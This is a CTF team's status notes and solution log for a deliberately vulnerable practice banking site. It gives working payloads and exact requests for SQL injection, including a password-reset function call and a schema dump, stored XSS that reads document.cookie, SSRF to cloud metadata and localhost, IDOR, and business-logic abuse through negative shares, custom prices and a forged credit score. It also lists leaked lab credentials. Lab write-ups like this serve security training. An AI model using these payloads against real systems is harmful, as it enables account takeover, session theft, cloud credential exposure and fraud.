# DarkMoney CTF — Status & Solutions

**Competition:** Schwab 2026 Advanced | **Team score:** 2420 | **Team rank:** improving  
**Progress:** 16 of 37 challenges solved  
**Target:** https://50-18-145-16-darkmoneyprod.vulnerablesites.net  
**Tracker:** https://crwd-ctrl.net/d9e8f33f-db5e-405c-8236-499d2f0df794  
**Account:** Alice Morgan (user ID 1, clientId DM-CLIENT-A9F131)

---

## ✅ SOLVED

| Challenge | Character | Points | Solution Summary |
|-----------|-----------|--------|-----------------|
| Whispers in the Source | Limbo | 50 | Sensitive data in page HTML source/comments |
| The Open Ledger | Limbo | 150 | IDOR on account/ledger data |
| Not Your Loan | Limbo | 50 | IDOR on `GET /api/users/{id}/loans` |
| Things You Were Asked Not to See | Limbo | 70 | robots.txt → `/secrets` → credentials + flag |
| Paper Trail | Limbo | 250 | IDOR on `GET /api/users/{id}/transactions/download` → user2 PDF |
| Locked, But Not Really | Limbo | 100 | Account lockout is cosmetic (`blocked:true` but not enforced) |
| Knock and Listen | Limbo | 50 | Differential 403 (exists) vs 404 (not found) on `GET /api/bill-pay/payments/{id}` |
| The Forgotten Rite | Trex | 120 | Sequential int IDOR on `GET /api/oracle/positions/{id}` (IDs 1–6 = other users) |
| A Tribute in Reverse | Trex | 100 | Negative shares on `POST /api/oracle/markets/{id}/orders` → money flows TO us |
| Name Your Price | Trex | 150 | Custom `entryPriceCents: 1` on oracle bet — pay 1¢ per share instead of market price |
| Borrowed Confidence | Trex | 320 | Business logic flaw — submit loan with fake creditScore: 850; server accepts without verification |
| Say It Again | Trex | 100 | Stored XSS — `POST /api/transactions` with XSS in `remarks`, then `GET /api/transactions/statement/print` renders it |
| By Any Other Name | Trex | 200 | Stored XSS in account displayName — `POST /api/accounts` with `displayName: '<script>alert(1)</script>'` |
| The Prophecy That Speaks | Trex | 200 | XSS filter bypass — `POST /api/oracle/markets` with `<img src=x onerror=alert(1)>` in description (script tag blocked but img onerror bypasses V1 filter) |
| Between the Lines | Trex | 250 | HTML attribute injection via unescaped `"` in bill-pay memo — `$A()` renders `title="${memo}"` without escaping quotes; payload: `x" onmouseover="alert(document.cookie)` |
| Honest Answers | Alpaca | 260 | SQLi — `GET /api/transactions?search='` causes DB 500 error; single quote breaks query syntax |

| Second Chances | Alpaca | 500 | SQLi to call `reset_password_token('pkapoor','Hacked123!')` via OR injection in `GET /api/transactions?search=` |

| Ask a Crooked Question | Alpaca | 340 | SQLi on oracle search → `oracle_service_secrets` table → `search_flag = 383342zBE-56aT13f3625` → submitted to crwd-ctrl |
| Trust Issues | Octopus | 300 | SSRF via `GET /api/cards/1/reward-points?rewardServiceUrl=http://localhost/internal/files/reward_client.json` → flag `DMP_FLAG_SSRF_INTERNAL_FILE_ACCESS` |
| Loaded Questions | Hippo | 100 | SQLi on `GET /api/manual-links/connector?connectorId='` → MySQL 8.4.11, 3 columns; `GROUP_CONCAT(table_name)` dumps partner DB tables |
| Overreach | Hippo | 250 | SSRF via `POST /api/partner-banks/{id}/discover` to `169.254.169.254` → flag `B3D3C2zAD-254T609`; submitted to crwd-ctrl |
| Speak as the Oracle | Octopus | 200 | Broken auth on `POST /api/oracle/markets/{id}/settle` — no seer token required; settle via UI "Consult the Oracle" button |
| A Verdict Never Spoken | Octopus | 400 | Settled an OPEN/unresolved market via `POST /api/oracle/markets/{id}/settle` before its natural close |
| The Seer's Sigil | Octopus | 300 | Hardcoded rehearsal resolver token in JS DOM comment → `POST /api/oracle/markets/1200/resolve` with `X-Oracle-Resolver-Token: ORCL-RSLVR-7c4f9a2e8b1d` |

**Total earned: 4810 pts**

---

## 🔄 IN PROGRESS (incomplete challenges)

### Honest Answers — 260 pts
- `GET /api/transactions?search='` → HTTP 500 (DB error — unescaped quote breaks SQL query)
- crwd-ctrl auto-detected on the 500 response
- Further SQLi: `' OR 1=1--` returns all transactions (bypass filter), `' OR '1'='1` also works

### Between the Lines — 250 pts
- `$A(e.memo)` function creates `<span class="memo-note" title="${n}">${s}</span>`
- `n` only escapes `&`, `<`, `>` — NOT `"` — so `"` in memo breaks out of title attribute
- Payload: `x" onmouseover="alert(document.cookie)` → creates `title="x" onmouseover="alert(document.cookie)"`
- `POST /api/bill-pay/payments` with memo payload, then navigate to `/bill-pay/payments/{id}`
- crwd-ctrl auto-detected when payment detail page loaded

### Second Chances — 500 pts ✅
- **Vulnerability:** SQL Injection → DB function call
- **Exact request:** `GET /api/transactions?search=%25'%20OR%20reset_password_token('pkapoor','Hacked123!')%3E'a'%20OR%20'1'%3D'`
- **Payload:** `%' OR reset_password_token('pkapoor','Hacked123!')>'a' OR '1'='`
- **Why no `--`:** The `--` comment caused the UNION ALL from the template to remain in the SQL, generating bad grammar. Using `OR '1'='` to close the string instead keeps everything valid.
- **Proof:** crwd-ctrl auto-detected (+500 pts), score now 2920

### Ask a Crooked Question — 340 pts ✅
- **Vulnerability:** SQLi on oracle search endpoint → cross-table exfiltration
- **Exact request:** `GET /api/oracle/markets?search=...` with UNION SELECT from oracle_service_secrets
- **Flag:** `383342zBE-56aT13f3625` (from `oracle_service_secrets` where `secret_key='search_flag'`)
- **SQLi trick:** Use `TIMESTAMP '9999-12-31 00:00:00'` for future-date sort (sorts first), close string with `AND col>'` instead of `--`

### Trust Issues — 300 pts ✅
- **Vulnerability:** SSRF via `rewardServiceUrl` parameter on the Dark Rewards card endpoint
- **Exact request:** `GET /api/cards/1/reward-points?rewardServiceUrl=http://localhost/internal/files/reward_client.json`
- **Discovery chain:**
  1. Navigate to `/cards` → see "Dark Rewards" section → note network call to `/api/cards/1/reward-points?rewardServiceUrl=https://rewards.darkmoney-bank.com/api/points`
  2. Send internal URL → 400 error leaks: `{"location":"/localhost/internal/files","filesAvailable":["reward_client.json","rewards_backup.txt"]}`
  3. Use leaked path: `rewardServiceUrl=http://localhost/internal/files/reward_client.json` → 200 `{"flag":"DMP_FLAG_SSRF_INTERNAL_FILE_ACCESS"}`
- **Flag:** `DMP_FLAG_SSRF_INTERNAL_FILE_ACCESS`
- **Submission:** CHALLENGE_KEY form on crwd-ctrl

### Loaded Questions — 100 pts ✅
- **Vulnerability:** SQLi on `GET /api/manual-links/connector?connectorId=` (MySQL backend)
- **Exact request:** `GET /api/manual-links/connector?connectorId='` → 400 with MySQL syntax error
- **Exploit:** `xxx' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ','),'x','x' FROM information_schema.tables WHERE table_schema=database()-- -`
- **DB:** MySQL 8.4.11, database `darkmoney_partners`
- **Tables found:** `partner_bank`, `partner_bank_account`, `partner_bank_user`
- **Data dumped:** Partner bank user credentials + all 7 partner bank codes + account data
- **Partner users:** atlantis.customer, gross.notional, konza.member, fu.exchange, sovereign.holder, gilded.trust, sylvan.member, atlantis.h1pp0
- **Submission:** Auto-detected via SQLi error, then data exfil

### Overreach — 250 pts ✅
- **Vulnerability:** SSRF via `POST /api/partner-banks/{id}/discover` with `{discoveryHost: "HOST"}`
- **Exact request:** `POST /api/partner-banks/1/discover` with `{"discoveryHost":"169.254.169.254"}`
- **Response:** `{"status":"UNVERIFIED","discoveryDocument":{"instance-id":"i-0f2a9c4b7e13d8506","iam":{"info":{"InstanceProfileArn":"arn:aws:iam::481563927104:instance-profile/darkmoney-linking-role"}},...},"flag":"B3D3C2zAD-254T609"}`
- **Other SSRF targets found:** `dmlink-config.internal` (→ link_signing_key), `198.51.100.66:8443` (Sylvan bank IP, REACHABLE), `link.sovereign-union.invalid` (REACHABLE)
- **Flag:** `B3D3C2zAD-254T609`
- **Submission:** Manual SUBMIT form on crwd-ctrl

### Speak as the Oracle — 200 pts ✅
- **Vulnerability:** Broken authorization — `POST /api/oracle/markets/{id}/settle` has no seer token check
- **Exact request:** Click "Consult the Oracle" button on `/oracle/resolutions` page → triggers `POST /api/oracle/markets/1300/settle` via UI
- **Key insight:** The settle endpoint "never asks whose hand is upon it" — no auth beyond session cookie
- **Why UI required:** crwd-ctrl auto-detection required the request to come through the browser UI (via Axios), not a raw fetch
- **Proof:** crwd-ctrl auto-detected (+200 pts), score 3760

### A Verdict Never Spoken — 400 pts ✅
- **Vulnerability:** Same broken auth as Speak as the Oracle, but settling a market BEFORE it closes (no declared outcome yet)
- **Exact request:** Previously settled markets 1001, 1002, 1005 via `POST /api/oracle/markets/{id}/settle` on OPEN/CLOSED-but-unresolved markets
- **Key insight:** Markets with PENDING verdict (closed but not settled) can be force-settled, paying out oracle winnings prematurely
- **Proof:** crwd-ctrl auto-detected alongside Speak as the Oracle (+400 pts), score 4160

### The Seer's Sigil — 300 pts ✅
- **Vulnerability:** Hardcoded rehearsal resolver token in JS source code (never rotated/removed)
- **Discovery:** JS bundle (`/assets/index-CY4Df-gA.js`) injects an HTML comment into the DOM on the `/oracle/resolutions` page containing:
  ```
  X-Oracle-Resolver-Token: ORCL-RSLVR-7c4f9a2e8b1d
  ```
  Comment is visible via `document.createTreeWalker(document.body, NodeFilter.SHOW_COMMENT)`
- **Exact request:**
  ```
  POST /api/oracle/markets/1200/resolve
  X-Oracle-Resolver-Token: ORCL-RSLVR-7c4f9a2e8b1d
  Content-Type: application/json
  {"outcome": "YES"}
  ```
  Market 1200 was in CLOSED state (trading ended, not yet resolved). Markets 1200 and 1201 found by probing IDs above the standard range.
- **Proof:** crwd-ctrl auto-detected on successful 200 response (+300 pts), score 4810
- **Key insight:** Challenge hint said "in plain sight, if you're willing to look where the page would rather you didn't" — the token was in a DOM comment injected by React, invisible in the UI but visible in page source/DevTools

### Frozen Assets (Alpaca)
- **Vector:** Bypass UI restriction to fund bill payment from frozen account
- **Hint:** "An option removed from the screen is not an option forbidden. Find the path the interface does not offer, and fund a bill payment from the account that was told to sit still."
- **Target account:** DMACC1005 (user 5's LOCKED account, balance $101,920)
- **Problem:** `POST /api/bill-pay/payments` with `fromAccountNumber: "DMACC1005"` returns 400 "Account DMACC1005 is not owned or linked by amorgan"
- **Options to try:**
  1. First link DMACC1005 to our account via `/api/linked-accounts`
  2. Find a hidden "admin" override or account transfer endpoint
  3. Use JWT signing key to forge a token as user 5 and make payment that way
  4. Try SSRF or parameter pollution to bypass ownership check

---

## 🔒 LOCKED / NOT YET UNLOCKED

Additional challenges are still locked (unlock by completing prerequisites):
- Trex: 3 locked challenges
- Alpaca: 3 locked challenges
- Octopus: 1 locked challenge (after Seer's Sigil — now unlocked: A Foregone Prophecy, Author of the Verdict, A Runner Misdirected)
- Hippo: 2 locked challenges

---

## Solution Details

### Things You Were Asked Not to See — 70 pts — Flag: `ROBOTS_ARE_NOT_GUARDS`
1. `GET /robots.txt` → reveals `Disallow: /debug`, `/test`, `/secrets`
2. `GET /secrets` → HTML page with app credentials + flag

**Credentials leaked at /secrets:**
- `AWS_ACCESS_KEY_ID`: `AKIAFAKE1234567890`
- `AWS_SECRET_ACCESS_KEY`: `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`
- `DB_PASSWORD`: `CorrectHorseBatteryStaple_final_final`
- `JWT_SIGNING_KEY`: `super-secret-signing-key-only-for-darkmoney-admins`
- `ENCRYPTION_SALT`: `NaCl_just_a_pinch`

### Paper Trail — 250 pts
1. `GET /api/users/2/transactions/download` returns 200 PDF (user 1–5 work, 6–8 → 400)
2. User 2 = **Priya Kapoor**, username **pkapoor**, accounts: DMACC1002/1007/1011/1013
3. Downloaded via: `fetch('/api/users/2/transactions/download', {credentials:'include'})`
4. Uploaded PDF to crwd-ctrl challenge form → 250 pts

### Locked, But Not Really — 100 pts
- Send 3+ wrong login attempts for `pkapoor`: `POST /api/auth/login` with wrong password
- After attempt 3: `{"success":false,"blocked":true}` appears
- Backend does NOT actually enforce the block
- Just triggering `blocked:true` state completed the challenge

### Knock and Listen — 50 pts
- `GET /api/bill-pay/payments/{id}` returns:
  - **403** `{"message":"Payment belongs to another account"}` → record exists, different user
  - **404** `{"message":"Payment not found"}` → record doesn't exist
- Our payment IDs: 1–52; ID 53+ = other users (all return 403)

### The Forgotten Rite — 120 pts
- `GET /api/oracle/positions` returns our bets: IDs 7, 8, 9, 10…
- `GET /api/oracle/positions/1` returns 200 → user 1's position (not ours!)
- IDs 1–6 all accessible = other users' oracle positions (sequential int IDOR)

### A Tribute in Reverse — 100 pts
- `POST /api/oracle/markets/1005/orders` with `{"side":"YES","shares":-100}`
- Server accepts negative shares → `costCents: -5800` → wallet INCREASES by $58
- Wallet went from $2500 → $2558

### Name Your Price — 150 pts
- `POST /api/oracle/markets/1005/orders` with `{"side":"YES","shares":100,"entryPriceCents":1}`
- Server accepts custom price → bought 100 shares at 1¢ each ($1) instead of 58¢ each ($58)
- Response: `{"entryPriceCents":1,"costCents":100,"walletBalance":"2557.00"}`

### Borrowed Confidence — 320 pts
- `POST /api/loans` with `{"loanType":"PERSONAL","loanAmount":25000,"creditScore":850}`
- Server accepts caller-supplied creditScore without verification → loan approved instantly
- crwd-ctrl auto-detected when the loan was approved

### Say It Again — 100 pts
- `POST /api/transactions` with `{"fromAccountNo":"DMACC1001","toAccountNo":"DMACC1006","amount":1,"remarks":"<script>alert(document.cookie)</script>"}`
- Then `GET /api/transactions/statement/print` renders remarks field unsanitized in HTML
- crwd-ctrl auto-detected on the statement print request

### By Any Other Name — 200 pts
- `POST /api/accounts` with `{"productId":"high-yield-savings","openingDeposit":100,"fundingType":"INTERNAL","fromAccountNo":"DMACC1001","displayName":"<script>alert(1)</script>"}`
- Server stores XSS payload in account displayName — form UI never allows custom names
- crwd-ctrl auto-detected when accounts page loaded

### The Prophecy That Speaks — 200 pts
- XSS guard "V1" blocks `<script>` tags but NOT other event handlers
- `POST /api/oracle/markets` with `description: "<img src=x onerror=alert(1)> — this is a test market..."`
- Fields required: `question`, `description` (min 12), `category` (POP/TECH/OFFICE/CIVIC), `closesAt`, `initialYesCents` (1-99), `depositCents` (2500-1000000)
- Navigate to the created market URL to trigger XSS — crwd-ctrl auto-detected

---

## Login Instructions

**URL:** https://50-18-145-16-darkmoneyprod.vulnerablesites.net/login

Two-step form: username → Continue → password → Login

**Credentials** (from HTML source comment — "Whispers in the Source" challenge):
- Username: `amorgan`
- Password: `test@DM123!`

To log in programmatically when session expires:
```javascript
fetch('/api/auth/login', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username:'amorgan', password:'test@DM123!'})})
```

---

## Key API Endpoints

| Endpoint | Method | Notes |
|----------|--------|-------|
| `/robots.txt` | GET | Leaks hidden paths |
| `/secrets` | GET | Leaks all app credentials |
| `/api/users/self` | GET | Own user object |
| `/api/users/{id}/accounts` | GET | IDOR — users 1–9 |
| `/api/users/{id}/loans` | GET | IDOR — users 1–8 |
| `/api/users/{id}/transactions/download` | GET | IDOR PDF — users 1–5 |
| `/api/transactions/statement/print` | GET | HTML statement — XSS vector |
| `/api/transactions?page=0&size=10` | GET | Paginated tx list |
| `/api/bill-pay/payments?page=0&size=50` | GET | Own bill payments (IDs 1–52) |
| `/api/bill-pay/payments/{id}` | GET | 403=other user, 404=doesn't exist |
| `/api/bill-pay/payments` | POST | Create payment (requires owned account) |
| `/api/bill-pay/payees` | GET | List payees |
| `/api/oracle/positions` | GET | Own oracle bets |
| `/api/oracle/positions/{id}` | GET | IDOR — sequential int IDs (1–6 = other users) |
| `/api/oracle/markets/{id}/orders` | POST | Place bet — vulnerable to negative shares + custom price |
| `/api/oracle/wallet` | GET | Oracle wallet balance |
| `/api/oracle/wallet/deposit` | POST | Deposit to wallet |
| `/api/oracle/wallet/withdraw` | POST | Withdraw from wallet |
| `/api/oracle/markets` | GET | List oracle markets |
| `/api/oracle/markets/{id}` | GET | Market details |
| `/api/oracle/results` | GET | Resolved markets |
| `/api/auth/login` | POST | `{username,password}` → `{success,blocked}` |
| `/api/linked-accounts` | GET/POST | Linked external accounts |
| `/api/partner-banks` | GET | Lists 4 partner banks |
| `/api/manual-links/connector?connectorId=X` | GET | Bank connector info |

## Known Users
| UserID | Name | Username | Accounts | Notes |
|--------|------|----------|----------|-------|
| 1 | Alice Morgan | amorgan | DMACC1001, 1006, 1009 | Our account |
| 2 | Priya Kapoor | pkapoor | DMACC1002, 1007, 1011, 1013 | PDF user |
| 3 | ? | ? | DMACC1003, 1010 | |
| 4 | ? | ? | DMACC1004, 1008, 1012 | |
| 5 | ? | ? | DMACC1005 (LOCKED, $101,920) | Illumistrami account |
| 6 | ? | ? | DMACCLOAN001 | |
| 7 | ? | ? | DMACCRAIL001-003 | Rail/payment processors |
| 8 | ? | ? | DMACCORCL000 | Oracle account |
| 9 | ? | ? | DMACCEXT0001-0007 | External/shadow accounts |

## Partner Bank Codes
- `DM-ATL-0042` — Bank of Atlantis (api.bankofatlantis.example)
- `DM-GRO-0117` — Groß Notional Bank (api.gross-notional.example.net)
- `DM-TGK-0298` — Tallgrass Konza Bank (api.tallgrasskonza.test)
- `DM-FUE-0531` — Font & Underwood Exchange (underwood-exchange.example)
- `DM-SUD-0719` — Sovereign Union Deposit Obligations (link.sovereign-union.invalid) **REACHABLE via SSRF**
- `DM-GRF-0824` — Gilded Reserve And Financial Trust (gilded-reserve.example.com)
- `DM-SYL-0066` — Sylvan Community & Mutual Credit Union (198.51.100.66:8443) **REACHABLE via SSRF, real IP**

## Partner Bank User Credentials (from MySQL SQLi)
| Username | Password | Bank |
|----------|----------|------|
| atlantis.customer | Tr1ton&Reef2026 | Bank of Atlantis |
| gross.notional | Pr3z1si0n#GN26 | Groß Notional Bank |
| konza.member | Pra1ri3$Konza7 | Tallgrass Konza Bank |
| fu.exchange | W1re&Underw00d8 | Font & Underwood Exchange |
| sovereign.holder | D1scr33t$SUD19 | Sovereign Union |
| gilded.trust | G0ld3n@Reserve4 | Gilded Reserve |
| sylvan.member | C0mmun1ty&Sylv0 | Sylvan Community |
| atlantis.h1pp0 | 7e3023bfc3bb1666fe3a0e76 | Bank of Atlantis (hex token?) |

## Tech Stack
- Frontend: React/Vite SPA
- Backend: nginx 1.31.6
- Auth: HttpOnly session cookie
- Axios for API calls (not fetch)
- SPA routes: `/transactions`, `/accounts`, `/transfer`, `/cards`, `/loans`, `/oracle`, `/bill-pay`
- JS bundle: `/assets/index-CY4Df-gA.js`

## Local LLM
```bash
curl http://localhost:11434/api/chat \
  -d '{"model":"qwen38-27b-unc-q4:latest","messages":[{"role":"user","content":"PROMPT"}],"stream":false,"think":true,"options":{"temperature":0.7,"num_ctx":32768},"keep_alive":-1}'
```
